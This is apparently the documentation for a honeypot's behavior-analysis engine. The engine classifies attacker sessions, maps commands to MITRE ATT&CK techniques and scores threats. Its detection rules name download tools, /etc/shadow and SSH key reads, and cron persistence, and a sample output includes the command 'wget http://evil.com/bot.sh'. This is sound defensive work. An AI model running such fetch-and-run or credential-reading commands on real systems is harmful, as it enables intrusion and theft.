# Behavior Analysis Engine

The behavior engine transforms raw session data into rich, ML-enriched attacker profiles. It answers the question every SOC analyst needs answered: *who is this attacker and what are they trying to do?*

---

## Components

| Component | File | Role |
|-----------|------|------|
| `SessionFeatureExtractor` | `src/behavior/classifier.py` | Session dict → 13-dim feature vector |
| `AttackerClassifier` | `src/behavior/classifier.py` | VotingClassifier (RF + SVM) |
| `TTPExtractor` | `src/behavior/ttp_extractor.py` | Commands → MITRE ATT&CK technique IDs |
| `BehaviorEngine` | `src/behavior/behavior_engine.py` | Background polling loop; orchestrates classification |
| `AttackerProfile` | `src/behavior/attacker_profile.py` | Per-IP persistent record |
| `train_classifier.py` | `src/behavior/train_classifier.py` | Offline training script |

---

## Feature Engineering

`SessionFeatureExtractor` converts a Cowrie session document into a 13-dimensional numeric vector:

| Feature | Description |
|---------|-------------|
| `total_commands` | Number of commands executed |
| `unique_commands` | Count of distinct commands |
| `dangerous_count` | Commands matching danger patterns (wget, chmod, shadow, etc.) |
| `recon_count` | Commands matching recon patterns (id, uname, netstat, etc.) |
| `download_attempts` | wget/curl/tftp invocations |
| `file_access` | /etc/, /home/, .ssh/ accesses |
| `session_duration` | end_time − start_time in seconds |
| `login_attempts` | Total login attempts in the session |
| `failed_logins` | Failed login count |
| `has_persistence` | 1 if crontab/systemctl/bashrc found |
| `has_lateral` | 1 if ssh/scp/rsync to another host |
| `dangerous_ratio` | dangerous_count / total_commands |
| `recon_ratio` | recon_count / total_commands |

---

## Intent Classifier

`AttackerClassifier` is a `VotingClassifier` combining a RandomForest and an SVM (soft voting). The model is trained on labeled session feature vectors.

### Intent Classes (6)

| Class | Behavioral Signature |
|-------|---------------------|
| `reconnaissance` | Enumeration commands (id, uname, ls, netstat), minimal payload. Default fallback. |
| `credential_harvesting` | Reads /etc/shadow, ~/.ssh, bash_history. Brute-force without further commands. |
| `malware_deployment` | wget/curl/tftp + chmod +x + execute, or scp upload. |
| `lateral_movement` | ssh/scp/rsync to other hosts, network sweeps. |
| `cryptomining` | xmrig, miner binaries, pool URLs, high-CPU fingerprints. |
| `bot_enrollment` | Fetch-and-run loader + persistence via cron, /ip cloud, router fingerprints. |

### Attacker Tiers (3)

| Tier | Characteristics |
|------|----------------|
| `beginner` | Simple brute-force or single recon commands; short sessions |
| `automated_bot` | High-speed credential stuffing; consistent short sessions; known tool signatures |
| `advanced_human` | Multi-stage attack; lateral movement; privilege escalation; custom payloads |

### Performance Target

Macro-F1 > 0.85 on the held-out test split. Pre-trained models in `data/models/`:

- `classifier.joblib` — VotingClassifier (intent)
- `scaler.joblib` — StandardScaler
- `label_encoder.joblib` — LabelEncoder (tier)

### Training

```bash
# In Docker
docker compose exec behavior-engine python -m src.behavior.train_classifier

# Locally
python -m src.behavior.train_classifier
```

Training uses a synthetic dataset augmented by any real Cowrie sessions available in `cowrie_sessions`. Output is saved to `data/models/`.

---

## TTP Extraction

`TTPExtractor` (`src/behavior/ttp_extractor.py`) maps individual commands to MITRE ATT&CK technique IDs using two layers:

### Layer 1 — Rule-Based Exact Matching (50+ rules)

```python
EXACT = {
    "wget": ("T1105", "Command and Control", 0.95),
    "curl": ("T1105", "Command and Control", 0.95),
    "crontab": ("T1053.003", "Persistence", 0.90),
    "/etc/shadow": ("T1003.008", "Credential Access", 0.95),
    "uname": ("T1082", "Discovery", 0.85),
    "id": ("T1033", "Discovery", 0.85),
    "netstat": ("T1049", "Discovery", 0.80),
    "chmod +s": ("T1548.001", "Privilege Escalation", 0.90),
    "ssh": ("T1021.004", "Lateral Movement", 0.85),
    ...
}
```

### Layer 2 — Embedding Fallback

Commands that don't match any exact rule are encoded with `sentence-transformers` (`all-MiniLM-L6-v2`) and compared against pre-embedded MITRE technique descriptions. If cosine similarity exceeds 0.65, the best match is used with confidence = similarity.

### Output

```python
[
  {"technique_id": "T1105", "tactic": "Command and Control",
   "confidence": 0.95, "matched_command": "wget http://evil.com/bot.sh"},
  {"technique_id": "T1053.003", "tactic": "Persistence",
   "confidence": 0.90, "matched_command": "crontab -e"},
]
```

---

## AttackerProfile

`AttackerProfile` (`src/behavior/attacker_profile.py`) is the central per-IP record aggregating everything the system knows about one attacker.

```python
{
    "src_ip": "203.0.113.45",
    "first_seen": 1780000000.0,
    "last_seen": 1780969777.0,
    "session_count": 12,
    "total_commands": 340,
    "classified_intent": "malware_deployment",
    "attacker_tier": "automated_bot",
    "threat_score": 78.0,
    "ttps": [
        {"technique_id": "T1105", "tactic": "Command and Control", "confidence": 0.95}
    ],
    "campaign_id": None,
    "country": "Netherlands",
    "lat": 52.37,
    "lon": 4.90,
    "is_blocked": False,
    "response_action": "isolate_alert"
}
```

### Threat Score Formula

```
threat_score = (ML confidence × 40)
             + TTP score
             + tier_bonus
             + persistence_bonus
             + volume_bonus
```

| Component | Range | Calculation |
|-----------|-------|-------------|
| ML confidence | 0–40 | Classifier confidence (0.0–1.0) × 40 |
| TTP score | 0–40 | Sum of (tactic_weight × confidence) per TTP, capped at 40 |
| Tier bonus | 0–30 | beginner: 0 · automated_bot: +15 · advanced_human: +30 |
| Persistence bonus | 5–65 | Tiered by `session_count` (see table below) |
| Volume bonus | 0–15 | `min(total_commands // 5, 15)` |

**Persistence bonus tiers:**

| Sessions | Bonus |
|----------|-------|
| 1 | 5 |
| 2 | 18 |
| 3–4 | 22 |
| 5–9 | 28 |
| 10–19 | 40 |
| 20–49 | 50 |
| 50–99 | 60 |
| 100+ | 65 |

**Tactic weights (for TTP score):**

| Tactic | Weight |
|--------|--------|
| Impact | 40 |
| Privilege Escalation | 35 |
| Credential Access | 30 |
| Lateral Movement | 25 |
| Persistence | 20 |
| Command and Control | 15 |
| Defense Evasion | 10 |
| Discovery | 5 |

Score is capped at 100.

### Intent Reclassification

`reclassify_intent()` re-examines **all** commands accumulated across a profile's sessions (not just the most recent session). This prevents a profile from staying stuck at `reconnaissance` after early brute-force sessions.

Priority order (first match wins):

1. `cryptomining` — xmrig, miner keywords, `grep.*miner`
2. `malware_deployment` — wget/curl/tftp + chmod/bash/.sh, or scp -t + execute
3. `credential_harvesting` — /etc/shadow access, or brute-force with no commands
4. `bot_enrollment` — crontab/.bashrc persistence, /ip cloud, CPU probing
5. `lateral_movement` — ssh/scp/rsync with > 3 occurrences
6. `reconnaissance` — default fallback

---

## BehaviorEngine Polling Loop

`BehaviorEngine` (`src/behavior/behavior_engine.py`) runs as a background thread (one per container) and continuously processes new sessions:

```
while True:
    sessions = db.cowrie_sessions.find({"processed": False})
    for session in sessions:
        features = SessionFeatureExtractor.extract(session)
        intent, confidence = AttackerClassifier.load().predict(features)
        tier = AttackerClassifier.load().predict_tier(features)
        ttps = TTPExtractor().extract(session["commands"])
        profile = ProfileStore.get_or_create(session["src_ip"])
        profile.update(session, intent, confidence, tier, ttps)
        profile.reclassify_intent()
        profile._compute_threat_score()
        ProfileStore.save(profile)
        db.cowrie_sessions.update_one({"session_id": session["session_id"]},
                                       {"$set": {"processed": True}})
    sleep(5)
```

---

## Verification

```bash
# Run the attack simulation to generate labeled sessions
python scripts/simulate_attack.py

# Check profiles were created
docker exec neurotrap-mongodb mongosh --quiet \
  -u admin -p "$MONGO_PASS" --authenticationDatabase admin neurotrap \
  --eval "db.attacker_profiles.find({},{src_ip:1,classified_intent:1,threat_score:1}).pretty()"

# Force recalculate all profiles
curl -s -X POST http://localhost:5000/api/profiles/recalculate | python3 -m json.tool
```
